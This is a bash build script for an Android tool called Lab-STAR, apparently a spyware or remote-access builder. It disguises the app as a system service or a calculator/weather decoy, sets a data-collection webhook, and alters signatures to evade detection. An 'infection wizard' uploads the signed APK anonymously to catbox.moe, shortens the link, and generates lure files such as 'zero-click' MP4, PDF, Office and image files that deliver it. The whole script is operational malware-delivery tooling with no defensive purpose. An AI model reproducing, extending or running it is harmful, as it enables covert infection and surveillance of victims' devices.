#!/bin/bash

#################################################
#          Lab-STAR APK BUILDER - Linux/Mac       #
#                   v1.5.0 Hardened              #
#                                               #
#  Developed by: Lab-STAR.LABS                  #
#  GitHub: https://github.com/K4N3CO-LABS/Lab-STAR #
#################################################

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Script paths
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
CONFIG_FILE="$SCRIPT_DIR/build_config.txt"

# Default logos
DEFAULT_LOGO="$PROJECT_DIR/assets/app_logo.png"
COVERT_LOGO="$PROJECT_DIR/assets/default_app_icon.png"

# Banner
print_banner() {
    clear
    echo -e "${CYAN}"
    echo " ┌──────────────────────────────────────────────────────────────┐"
    echo " │                                                              │"
    echo " │  ██╗  ██╗██╗  ██╗███╗   ██╗██████╗  ██████╗  ██████╗         │"
    echo " │  ██║ ██╔╝██║  ██║████╗  ██║╚════██╗██╔════╝ ██╔═══██╗        │"
    echo " │  █████╔╝ ███████║██╔██╗ ██║ █████╔╝██║      ██║   ██║        │"
    echo " │  ██╔═██╗ ╚════██║██║╚██╗██║ ╚═══██╗██║      ██║   ██║        │"
    echo " │  ██║  ██╗     ██║██║ ╚████║██████╔╝╚██████╗ ╚██████╔╝        │"
    echo " │  ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝         │"
    echo " │                                                              │"
    echo " │ PROJECT: Lab-STAR APK Builder | v1.5.0 Hardened              │"
    echo " │ GIT_UPLINK: https://github.com/K4N3CO-LABS/Lab-STAR           │"
    echo " │                                                              │"
    echo " └──────────────────────────────────────────────────────────────┘"
    echo -e "${NC}"
    echo ""
}

# Detect OS
detect_os() {
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        OS="linux"
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="mac"
    fi
}

# Check requirements
check_requirements() {
    echo -e "${CYAN}[*] Checking requirements...${NC}"
    detect_os
    if ! command -v java &> /dev/null; then
        echo -e "${RED}[!] Java is missing. Please install JDK 11+.${NC}"
        return 1
    else
        echo -e "${GREEN}[✓] Java found${NC}"
    fi
}

# Generate keystore
generate_keystore() {
    local AUTO_MODE="$1"
    KEYSTORE_PATH="$PROJECT_DIR/lab-rats-keystore.jks"
    if [ -f "$KEYSTORE_PATH" ] && [ "$AUTO_MODE" == "auto" ]; then return; fi

    if [ -f "$KEYSTORE_PATH" ]; then
        echo -e "${YELLOW}[!] Keystore already exists.${NC}"
        read -p "    Generate new keystore? (y/N): " REGENERATE
        if [[ ! "$REGENERATE" =~ ^[Yy]$ ]]; then return; fi
        rm -f "$KEYSTORE_PATH"
    fi
    
    echo -e "${CYAN}[*] Keystore Configuration${NC}"
    read -p "    Key alias [lab-rats-key]: " ALIAS; ALIAS=${ALIAS:-lab-rats-key}
    read -p "    Password [lab-rats123]: " PASS; PASS=${PASS:-lab-rats123}

    keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "$PASS" -keypass "$PASS" -dname "CN=Lab-STAR Developer, O=Lab-STAR.LABS, C=US" 2>/dev/null
    
    cat > "$PROJECT_DIR/keystore.properties" << EOF
storeFile=lab-rats-keystore.jks
storePassword=$PASS
keyAlias=$ALIAS
keyPassword=$PASS
EOF
    echo -e "${GREEN}[✓] Keystore ready${NC}"
}

# Configure logo
configure_logo() {
    echo -e "${CYAN}[*] Logo Configuration${NC}"
    echo "    1. Use Recommended Stealth logo (grey gear)"
    echo "    2. Use default Lab-STAR logo"
    echo "    3. Use custom logo (path)"
    echo "    4. Skip"
    read -p "    Choice (Default 1): " LOGO_OPTION
    LOGO_OPTION=${LOGO_OPTION:-1}

    case $LOGO_OPTION in
        1)
           # Recommended Stealth logo (Zoomed out 15% for perfect fit)
           if command -v magick &> /dev/null; then
               magick convert "$COVERT_LOGO" -resize 85% -gravity center -extent 512x512 "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png"
           elif command -v convert &> /dev/null; then
               convert "$COVERT_LOGO" -resize 85% -gravity center -extent 512x512 "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png"
           else
               cp "$COVERT_LOGO" "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png" 2>/dev/null
           fi
           ;;
        2) cp "$DEFAULT_LOGO" "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png" 2>/dev/null ;;
        3) read -p "    Enter path: " P; [ -f "$P" ] && cp "$P" "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png" ;;
    esac
    echo -e "${GREEN}[✓] Logo applied${NC}"
}

# Configure app settings
configure_app() {
    echo -e "${CYAN}[*] App Configuration${NC}"
    RAND_V="$((1 + RANDOM % 4)).$((RANDOM % 10)).$((RANDOM % 10))"

    read -p "    Enter App Name [System Stability Service]: " APP_NAME
    APP_NAME=${APP_NAME:-System Stability Service}

    read -p "    Enter Package ID [com.android.system.stability]: " PKG_NAME
    PKG_NAME=${PKG_NAME:-com.android.system.stability}

    read -p "    Enter Version Name [$RAND_V]: " VERSION_NAME
    VERSION_NAME=${VERSION_NAME:-$RAND_V}

    read -p "    Enter Min SDK [26]: " MIN_SDK
    MIN_SDK=${MIN_SDK:-26}

    echo -e "${CYAN}[*] Decoy Identity Selection${NC}"
    echo "    1. System Update (Gear)  2. Calculator"
    echo "    3. Weather               4. Settings"
    read -p "    Choice (Default 1): " DECOY_CHOICE
    DECOY_CHOICE=${DECOY_CHOICE:-1}

    BUILD_GRADLE="$PROJECT_DIR/app/build.gradle"
    sed -i '' "s|applicationId \"[^\"]*\"|applicationId \"$PKG_NAME\"|g" "$BUILD_GRADLE"
    sed -i '' "s|versionName \".*\"|versionName \"$VERSION_NAME\"|g" "$BUILD_GRADLE"
    sed -i '' "s|minSdk [0-9]*|minSdk $MIN_SDK|g" "$BUILD_GRADLE"
    sed -i '' "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">$APP_NAME</string>|g" "$PROJECT_DIR/app/src/main/res/values/strings.xml"
    
    echo "PKG_NAME=\"$PKG_NAME\"" > "$CONFIG_FILE"
    echo "APP_NAME=\"$APP_NAME\"" >> "$CONFIG_FILE"
    echo "VERSION_NAME=\"$VERSION_NAME\"" >> "$CONFIG_FILE"
    echo "MIN_SDK=\"$MIN_SDK\"" >> "$CONFIG_FILE"
    echo "DECOY_CHOICE=\"$DECOY_CHOICE\"" >> "$CONFIG_FILE"

    read -p "    Enter Webhook URL (Google Script): " WEB_URL
    if [ -n "$WEB_URL" ]; then
        # Use a different delimiter for sed in case URL contains |
        sed -i '' "s|WEBHOOK_URL=.*|WEBHOOK_URL=$WEB_URL|g" "$PROJECT_DIR/local.properties"
    else
        # Ensure it's at least empty if not set, without corrupting
        sed -i '' "s|WEBHOOK_URL=.*|WEBHOOK_URL=|g" "$PROJECT_DIR/local.properties"
    fi

    # Persist Decoy Choice for build.gradle
    if grep -q "DECOY_CHOICE=" "$PROJECT_DIR/local.properties"; then
        sed -i '' "s|DECOY_CHOICE=.*|DECOY_CHOICE=$DECOY_CHOICE|g" "$PROJECT_DIR/local.properties"
    else
        echo "DECOY_CHOICE=$DECOY_CHOICE" >> "$PROJECT_DIR/local.properties"
    fi

    # Generate Dynamic Encryption Key for every build
    RAND_KEY=$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16)
    if grep -q "ENCRYPTION_KEY=" "$PROJECT_DIR/local.properties"; then
        sed -i '' "s|ENCRYPTION_KEY=.*|ENCRYPTION_KEY=$RAND_KEY|g" "$PROJECT_DIR/local.properties"
    else
        echo "ENCRYPTION_KEY=$RAND_KEY" >> "$PROJECT_DIR/local.properties"
    fi

    # Add Binary Signature Entropy (Unique build hash)
    mkdir -p "$PROJECT_DIR/app/src/main/assets/sys"
    for i in {1..3}; do
        head -c 512 /dev/urandom > "$PROJECT_DIR/app/src/main/assets/sys/metadata_$i.dat"
    done

    # Randomize Service Labels in Manifest
    MANIFEST="$PROJECT_DIR/app/src/main/AndroidManifest.xml"
    NAMES=("Media Framework" "System Stability" "Core Controller" "Device Bridge" "Sync Service")
    RAND_NAME=${NAMES[$RANDOM % ${#NAMES[@]}]}
    sed -i '' "s|android:label=\"Core Processor\"|android:label=\"$RAND_NAME\"|g" "$MANIFEST"
}

# Progress bar function (SMOOTH OVERWRITE STYLE)
execute_build() {
    local task=$1; local label=$2; local expected_time=$3
    ./gradlew $task --no-daemon > build_log.txt 2>&1 &
    local pid=$!; local steps=40;

    # Calculate sleep time using bc, fallback to awk if bc fails
    local sleep_time=$(echo "scale=4; $expected_time / $steps" | bc 2>/dev/null || awk "BEGIN {print $expected_time / $steps}")

    for ((i=1; i<=steps; i++)); do
        if ! kill -0 $pid 2>/dev/null; then
            # Build finished early
            break
        fi

        local percentage=$((i * 100 / steps))
        local filled=$i
        local empty=$((steps - i))

        # Build the bar string
        local bar=$(printf "%${filled}s" | tr ' ' '█')
        local spaces=$(printf "%${empty}s")

        # Print using carriage return (\r) for smooth overwrite
        # If we reach the end but Gradle is still working, stay at 99% Finishing
        if [ $i -eq $steps ]; then
            printf "\r${CYAN}    [*] %-30s [${bar}${spaces}] 99%% ${YELLOW}[FINISHING...]${NC}\033[K" "$label"
        else
            printf "\r${CYAN}    [*] %-30s [${bar}${spaces}] %3d%% ${NC}\033[K" "$label" "$percentage"
        fi

        sleep $sleep_time
    done

    # Wait for actual completion without hanging at 100%
    while kill -0 $pid 2>/dev/null; do
        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] 99%% ${YELLOW}[FINISHING...]${NC}\033[K" "$label"
        sleep 0.5
    done

    wait $pid
    local status=$?

    # CLEAR LINE and print final result to prevent overlap
    if [ $status -eq 0 ]; then
        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] 100%% ${GREEN}[DONE]${NC}\033[K\n" "$label"
    else
        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] ERR  ${RED}[FAIL]${NC}\033[K\n" "$label"
    fi

    return $status
}

# Build APK
build_apk() {
    print_banner
    echo -e "${CYAN}[*] Initializing Build Engine...${NC}"
    cd "$PROJECT_DIR"
    chmod +x gradlew

    # Slowed down from 15s to 25s to better match modern Gradle build times
    execute_build "clean assembleRelease" "Compiling Resources & Signing" 25
    local BUILD_STATUS=$?

    mkdir -p "$SCRIPT_DIR/output"
    if [ $BUILD_STATUS -eq 0 ] && [ -f "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" ]; then
        cp "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" "$SCRIPT_DIR/output/signed_v1.apk"
        echo -e "\n${GREEN}[✓] Success: output/signed_v1.apk${NC}"
        echo -e "${YELLOW}[*] The build task is complete.${NC}"
        echo ""
        read -p "    Press Enter to continue..."
    else
        echo -e "${RED}[!] Build failed. Error Code: $BUILD_STATUS${NC}"
        echo -e "${YELLOW}[*] Check build_log.txt for details.${NC}"
        echo ""
        read -p "    Press Enter to return to menu..."
        return 1
    fi
}

# Standalone Exploit Generator
generate_exploit_standalone() {
    local TYPE="$1"; local URL="$2"; local EXTRA="$3"
    EXPLOIT_SRC="$PROJECT_DIR/app/src/main/java/com/labs/labrats/exploits/ExploitLab.java"
    TEMP_BIN="$SCRIPT_DIR/bin"; mkdir -p "$TEMP_BIN"
    # Added -sourcepath to help javac find package structure
    javac -sourcepath "$PROJECT_DIR/app/src/main/java" -d "$TEMP_BIN" "$EXPLOIT_SRC" 2>build_log.txt
    if [ $? -eq 0 ]; then
        cd "$SCRIPT_DIR/output"
        java -cp "$TEMP_BIN" com.labs.labrats.exploits.ExploitLab "$TYPE" "$URL" "$EXTRA" 2>>../build_log.txt
        cd "$SCRIPT_DIR"
    else
        echo -e "${RED}[!] Exploit compilation failed. Check build_log.txt${NC}"
    fi
}

# Infection Chain Wizard
infection_wizard() {
    print_banner
    echo -e "${RED}[>] STRATEGIC_INFECTION_WIZARD${NC}"
    echo -e "${YELLOW}    Step-by-step automated payload weaponization.${NC}"
    echo ""

    # Build sequence
    check_requirements || return
    generate_keystore
    configure_logo
    configure_app
    build_apk || return

    local SIGNED_APK="$SCRIPT_DIR/output/signed_v1.apk"

    echo ""
    echo -e "${CYAN}[HOSTING] Select strategy:${NC}"
    echo "    1. Anonymous Cloud (Catbox)  2. Direct IP (IPv6)"
    read -p "    Choice: " H
    local DOWNLOAD_URL=""
    if [ "$H" == "2" ]; then
        read -p "    Target IPv6: " IP
        DOWNLOAD_URL="http://[$IP]:9191/download/Update.apk"
    else
        echo -e "${YELLOW}[*] Uploading to Catbox.moe...${NC}"
        # Added -sS and error checking for curl
        DOWNLOAD_URL=$(curl -sS -F "reqtype=fileupload" -F "fileToUpload=@$SIGNED_APK" https://catbox.moe/user/api.php)
        if [ $? -ne 0 ] || [[ "$DOWNLOAD_URL" == *"ERROR"* ]] || [ -z "$DOWNLOAD_URL" ]; then
            echo -e "${RED}[!] Upload failed: $DOWNLOAD_URL${NC}"
            read -p "Press Enter to return..."
            return 1
        fi
        echo -e "${GREEN}[✓] Hosted: $DOWNLOAD_URL${NC}"

        # URL Shortening (New Optimization)
        echo -e "${YELLOW}[*] Shortening delivery URL...${NC}"
        SHORT_URL=$(curl -s "https://is.gd/create.php?format=simple&url=$DOWNLOAD_URL")
        if [[ "$SHORT_URL" == "http"* ]]; then
            DOWNLOAD_URL=$SHORT_URL
            echo -e "${GREEN}[✓] Shortened: $DOWNLOAD_URL${NC}"
        fi
    fi

    echo ""
    echo -e "${CYAN}[WEAPONIZE] Select Vector:${NC}"
    echo "    1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite"
    echo "    4. Dolby Audio     5. ADB Script    6. Bluetooth/NFC"
    echo "    7. Stego Image     8. PWA Bundle    9. Office Word"
    echo "    10. Office Excel   11. Ghost GIF (Zero-Click)"
    read -p "    Choice: " V
    case $V in
        1) generate_exploit_standalone "mp4" "$DOWNLOAD_URL" ;;
        2) generate_exploit_standalone "pdf" "$DOWNLOAD_URL" "Security_Audit" ;;
        3) generate_exploit_standalone "ics" "$DOWNLOAD_URL" "Security_Sync" ;;
        4) generate_exploit_standalone "dolby" "$DOWNLOAD_URL" ;;
        5) read -p "    Target IP: " TIP; generate_exploit_standalone "adb" "$DOWNLOAD_URL" "$TIP" ;;
        6) generate_exploit_standalone "vcf" "$DOWNLOAD_URL" "System_Update" ;;
        7) generate_exploit_standalone "stego" "$DOWNLOAD_URL" ;;
        8) generate_exploit_standalone "pwa" "$DOWNLOAD_URL" "System_Update" ;;
        9) generate_exploit_standalone "docx" "$DOWNLOAD_URL" "Security_Patch" ;;
        10) generate_exploit_standalone "xlsx" "$DOWNLOAD_URL" "Financial_Report" ;;
        11) generate_exploit_standalone "gif" "$DOWNLOAD_URL" ;;
        *) echo -e "${RED}[!] Invalid Choice${NC}" ;;
    esac

    echo -e "\n${GREEN}DEPLOYMENT PACKAGE READY: $DOWNLOAD_URL${NC}"
    echo -e "${CYAN}[INFO] Check output directory for payloads.${NC}"
    read -p "Press Enter to return..."
}

# Documentation Section
show_help() {
    print_banner
    echo -e "${WHITE}COMMAND_DOCUMENTATION_V1.5.0${NC}"
    echo "------------------------------------------------------------"
    echo -e "1. Start Build: Standard production flow."
    echo -e "2. Keystore Only: Unique signing certificate."
    echo -e "3. Logo Only: Change app icons."
    echo -e "4. App Settings: Change ID, Name, and Version."
    echo -e "5. Requirements: Check Java setup."
    echo -e "6. Infection Wizard: Full Build -> Host -> Weaponize."
    echo "------------------------------------------------------------"
    read -p "Press Enter..."
}

# Main menu
main_menu() {
    print_banner
    echo -e "${RED}[>] Build Options:${NC}"
    echo ""
    echo "    1. Start Build (Configure & Build)"
    echo "    2. Generate Keystore Only"
    echo "    3. Configure Logo Only"
    echo "    4. Configure App Settings Only"
    echo "    5. Check Requirements"
    echo "    6. Generate Infection Chain Package (Wizard)"
    echo "    7. Help / Documentation"
    echo "    8. Exit"
    echo ""
    read -p "    Choose option (Default 1): " MENU_OPTION
    MENU_OPTION=${MENU_OPTION:-1}

    case $MENU_OPTION in
        1) check_requirements; generate_keystore; configure_logo; configure_app; build_apk ;;
        2) check_requirements; generate_keystore ;;
        3) configure_logo ;;
        4) configure_app ;;
        5) check_requirements ;;
        6) infection_wizard ;;
        7) show_help ;;
        8) exit 0 ;;
    esac
}

# Run
while true; do
    main_menu
    # Clean up temporary build artifacts after every loop cycle
    rm -rf "$SCRIPT_DIR/bin"
done
